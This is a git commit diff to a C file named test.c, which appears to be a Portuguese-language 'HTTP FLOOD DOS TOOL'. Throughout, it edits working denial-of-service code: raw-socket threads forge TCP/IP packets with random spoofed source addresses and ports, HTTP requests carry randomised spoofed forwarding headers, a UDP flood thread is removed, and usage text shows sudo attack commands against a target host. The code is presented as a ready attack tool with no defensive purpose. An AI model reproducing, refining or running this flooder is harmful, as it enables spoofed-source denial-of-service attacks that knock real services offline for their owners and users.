4d7b58ac110256aaa48bda370777e482f6ea6c5e
raioirritaler00-spec <raio.irrita.ler00@gmail.com>
2026-07-04 04:05:25 -0300

    Update test.c

--- test.c
+++ test.c
@@ -114,7 +114,6 @@ void build_http_request(char *buffer, char *host, char *path, int size, int ua_i
     int r1 = rand() % 255, r2 = rand() % 255, r3 = rand() % 255, r4 = rand() % 255;
     int r5 = rand() % 255, r6 = rand() % 255, r7 = rand() % 255, r8 = rand() % 255;
     int r9 = rand() % 255, r10 = rand() % 255, r11 = rand() % 255, r12 = rand() % 255;
-    int r13 = rand() % 255, r14 = rand() % 255, r15 = rand() % 255, r16 = rand() % 255;
     
     snprintf(buffer, size,
         "GET %s HTTP/1.1\r\n"
@@ -127,31 +126,14 @@ void build_http_request(char *buffer, char *host, char *path, int size, int ua_i
         "Upgrade-Insecure-Requests: 1\r\n"
         "Cache-Control: no-cache, no-store, must-revalidate\r\n"
         "Pragma: no-cache\r\n"
-        "Expires: 0\r\n"
         "X-Forwarded-For: %d.%d.%d.%d\r\n"
         "X-Real-IP: %d.%d.%d.%d\r\n"
         "X-Client-IP: %d.%d.%d.%d\r\n"
-        "X-Originating-IP: %d.%d.%d.%d\r\n"
-        "X-Remote-IP: %d.%d.%d.%d\r\n"
-        "X-Remote-Addr: %d.%d.%d.%d\r\n"
-        "CF-Connecting-IP: %d.%d.%d.%d\r\n"
-        "True-Client-IP: %d.%d.%d.%d\r\n"
-        "X-Proxy-IP: %d.%d.%d.%d\r\n"
-        "Via: 1.1 varnish-v4, 1.1 cloudflare\r\n"
-        "X-Varnish: %d\r\n"
-        "X-Cache: HIT\r\n"
-        "X-Cache-Hits: %d\r\n"
         "Referer: http://%s/\r\n"
-        "Origin: http://%s\r\n"
         "\r\n",
         path, host, user_agents[ua_index % NUM_USER_AGENTS],
-        r1, r2, r3, r4, r5, r6, r7, r8,
-        r9, r10, r11, r12, r13, r14, r15, r16,
-        rand() % 255, rand() % 255, rand() % 255, rand() % 255,
-        rand() % 255, rand() % 255, rand() % 255, rand() % 255,
-        rand() % 255, rand() % 255, rand() % 255, rand() % 255,
-        rand() % 255, rand() % 255, rand() % 255, rand() % 255,
-        rand() % 100000, rand() % 1000, host, host
+        r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12,
+        host
     );
 }
 
@@ -165,18 +147,16 @@ void *http_flood_thread(void *arg) {
     char *payload;
     int packet_size;
     time_t end_time;
-    char http_request[8192];
+    char http_request[4096];
     int ua_counter = rand() % NUM_USER_AGENTS;
 
     sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sockfd < 0) {
-        printf("[Thread %d] Erro ao criar socket RAW: %s\n", args->thread_id, strerror(errno));
         return NULL;
     }
 
     int one = 1;
     if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-        printf("[Thread %d] Erro ao configurar IP_HDRINCL: %s\n", args->thread_id, strerror(errno));
         close(sockfd);
         return NULL;
     }
@@ -189,14 +169,12 @@ void *http_flood_thread(void *arg) {
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(args->port);
     if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
-        printf("[Thread %d] IP invalido: %s\n", args->thread_id, args->target);
         close(sockfd);
         return NULL;
     }
 
     end_time = time(NULL) + args->duration;
     int sent_count = 0;
-    int error_count = 0;
 
     while (attack_running && time(NULL) < end_time) {
         build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
@@ -204,13 +182,15 @@ void *http_flood_thread(void *arg) {
         
         packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + http_len;
         
+        if (packet_size > MAX_PACKET) {
+            packet_size = MAX_PACKET;
+            http_len = packet_size - sizeof(struct iphdr) - sizeof(struct tcphdr);
+        }
+        
         ip_header = (struct iphdr *)packet;
         tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
         payload = (char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr));
 
-        uint32_t src_ip = random_ip();
-        uint32_t src_port = 1024 + (rand() % 64511);
-        
         ip_header->ihl = 5;
         ip_header->version = 4;
         ip_header->tos = 0;
@@ -220,10 +200,10 @@ void *http_flood_thread(void *arg) {
         ip_header->ttl = 255;
         ip_header->protocol = IPPROTO_TCP;
         ip_header->check = 0;
-        ip_header->saddr = src_ip;
+        ip_header->saddr = random_ip();
         ip_header->daddr = target_addr.sin_addr.s_addr;
 
-        tcp_header->source = htons(src_port);
+        tcp_header->source = htons(1024 + (rand() % 64511));
         tcp_header->dest = htons(args->port);
         tcp_header->seq = rand();
         tcp_header->ack_seq = 0;
@@ -244,84 +224,14 @@ void *http_flood_thread(void *arg) {
             packets_sent++;
             bytes_sent += result;
             sent_count++;
-            
-            if (sent_count % 10 == 0) {
-                tcp_header->syn = 0;
-                tcp_header->ack = 1;
-                tcp_header->ack_seq = htonl(ntohl(tcp_header->seq) + 1);
-                tcp_header->seq = rand();
-                ip_header->saddr = random_ip();
-                tcp_header->source = htons(1024 + (rand() % 64511));
-                ip_header->check = 0;
-                ip_header->check = checksum((unsigned short *)packet, packet_size);
-                sendto(sockfd, packet, packet_size, 0,
-                       (struct sockaddr *)&target_addr, sizeof(target_addr));
-            }
-        } else {
-            error_count++;
-            if (error_count < 10) {
-                printf("[Thread %d] Erro sendto: %s (errno: %d)\n", 
-                       args->thread_id, strerror(errno), errno);
-            }
-            if (errno == EPERM || errno == EACCES) {
-                printf("[Thread %d] Permissao negada! Execute com sudo.\n", args->thread_id);
-                break;
-            }
-            usleep(1000);
         }
 
-        if (sent_count % 50 == 0) {
+        if (sent_count % 10 == 0) {
             usleep(1);
         }
     }
 
     close(sockfd);
-    printf("[Thread %d] Finalizada. Enviados: %d pacotes\n", args->thread_id, sent_count);
-    return NULL;
-}
-
-void *udp_flood_thread(void *arg) {
-    attack_args_t *args = (attack_args_t *)arg;
-    int sockfd;
-    struct sockaddr_in target_addr;
-    unsigned char *packet;
-    time_t end_time;
-
-    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sockfd < 0) {
-        printf("[Thread %d] Erro ao criar socket UDP: %s\n", args->thread_id, strerror(errno));
-        return NULL;
-    }
-
-    int bufsize = 1024 * 1024 * 16;
-    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
-
-    target_addr.sin_family = AF_INET;
-    target_addr.sin_port = htons(args->port);
-    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
-        printf("[Thread %d] IP invalido: %s\n", args->thread_id, args->target);
-        close(sockfd);
-        return NULL;
-    }
-
-    packet = malloc(args->packet_size);
-    end_time = time(NULL) + args->duration;
-    int sent_count = 0;
-
-    while (attack_running && time(NULL) < end_time) {
-        random_payload(packet, args->packet_size);
-        int result = sendto(sockfd, packet, args->packet_size, 0,
-                           (struct sockaddr *)&target_addr, sizeof(target_addr));
-        if (result > 0) {
-            packets_sent++;
-            bytes_sent += result;
-            sent_count++;
-        }
-    }
-
-    free(packet);
-    close(sockfd);
-    printf("[Thread %d] Finalizada. Enviados: %d pacotes\n", args->thread_id, sent_count);
     return NULL;
 }
 
@@ -338,13 +248,11 @@ void *udp_raw_flood_thread(void *arg) {
 
     sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sockfd < 0) {
-        printf("[Thread %d] Erro ao criar socket RAW: %s\n", args->thread_id, strerror(errno));
         return NULL;
     }
 
     int one = 1;
     if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-        printf("[Thread %d] Erro ao configurar IP_HDRINCL: %s\n", args->thread_id, strerror(errno));
         close(sockfd);
         return NULL;
     }
@@ -358,14 +266,12 @@ void *udp_raw_flood_thread(void *arg) {
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(args->port);
     if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
-        printf("[Thread %d] IP invalido: %s\n", args->thread_id, args->target);
         close(sockfd);
         return NULL;
     }
 
     end_time = time(NULL) + args->duration;
     int sent_count = 0;
-    int error_count = 0;
 
     while (attack_running && time(NULL) < end_time) {
         ip_header = (struct iphdr *)packet;
@@ -399,26 +305,10 @@ void *udp_raw_flood_thread(void *arg) {
             packets_sent++;
             bytes_sent += result;
             sent_count++;
-        } else {
-            error_count++;
-            if (error_count < 10) {
-                printf("[Thread %d] Erro sendto: %s (errno: %d)\n", 
-                       args->thread_id, strerror(errno), errno);
-            }
-            if (errno == EPERM || errno == EACCES) {
-                printf("[Thread %d] Permissao negada! Execute com sudo.\n", args->thread_id);
-                break;
-            }
-            usleep(1000);
-        }
-
-        if (sent_count % 1000 == 0) {
-            usleep(1);
         }
     }
 
     close(sockfd);
-    printf("[Thread %d] Finalizada. Enviados: %d pacotes\n", args->thread_id, sent_count);
     return NULL;
 }
 
@@ -454,10 +344,10 @@ void *stats_thread(void *arg) {
 void print_usage(char *program_name) {
     printf("\n=== HTTP FLOOD DOS TOOL ===\n\n");
     printf("Uso: %s <URL> <PORTA> <TEMPO> [OPCOES]\n\n", program_name);
-    printf("Argumentos obrigatorios:\n");
+    printf("Argumentos:\n");
     printf("  URL      - URL do alvo (ex: exemplo.com ou /caminho)\n");
     printf("  PORTA    - Porta de destino\n");
-    printf("  TEMPO    - Duracao do ataque em segundos\n\n");
+    printf("  TEMPO    - Duracao em segundos\n\n");
     printf("Opcoes:\n");
     printf("  -t       - Numero de threads (padrao: %d)\n", DEFAULT_THREADS);
     printf("  -s       - Tamanho do pacote (padrao: %d)\n", DEFAULT_SIZE);
@@ -465,8 +355,7 @@ void print_usage(char *program_name) {
     printf("  -h       - Ajuda\n\n");
     printf("Exemplos:\n");
     printf("  sudo %s exemplo.com 80 30\n", program_name);
-    printf("  sudo %s exemplo.com 443 60 -t 20 -s 1400\n", program_name);
-    printf("  sudo %s /api/test 8080 30 -t 10\n", program_name);
+    printf("  sudo %s exemplo.com 443 60 -t 20\n", program_name);
     printf("  sudo %s exemplo.com 80 30 -r\n", program_name);
     printf("\n");
 }
@@ -550,7 +439,7 @@ int main(int argc, char *argv[]) {
     }
 
     if (geteuid() != 0) {
-        printf("\n[!] HTTP FLOOD REQUER PERMISSAO DE ROOT!\n");
+        printf("\n[!] REQUER PERMISSAO DE ROOT!\n");
         printf("[!] Execute: sudo %s ...\n\n", argv[0]);
         return 1;
     }
@@ -565,20 +454,28 @@ int main(int argc, char *argv[]) {
     printf("User Agents: %d diferentes\n", NUM_USER_AGENTS);
     printf("==========================\n\n");
 
-    srand(time(NULL) ^ getpid() ^ (unsigned long)pthread_self());
+    srand(time(NULL) ^ getpid());
     signal(SIGPIPE, SIG_IGN);
 
     pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
     attack_args_t *args = malloc(num_threads * sizeof(attack_args_t));
 
+    if (threads == NULL || args == NULL) {
+        printf("Erro ao alocar memoria\n");
+        return 1;
+    }
+
     for (int i = 0; i < num_threads; i++) {
         strncpy(args[i].target, ip, sizeof(args[i].target) - 1);
+        args[i].target[sizeof(args[i].target) - 1] = '\0';
         args[i].port = port;
         args[i].duration = duration;
         args[i].packet_size = packet_size;
         args[i].thread_id = i;
         strncpy(args[i].host, host, sizeof(args[i].host) - 1);
+        args[i].host[sizeof(args[i].host) - 1] = '\0';
         strncpy(args[i].path, path, sizeof(args[i].path) - 1);
+        args[i].path[sizeof(args[i].path) - 1] = '\0';
 
         if (use_raw) {
             pthread_create(&threads[i], NULL, udp_raw_flood_thread, &args[i]);
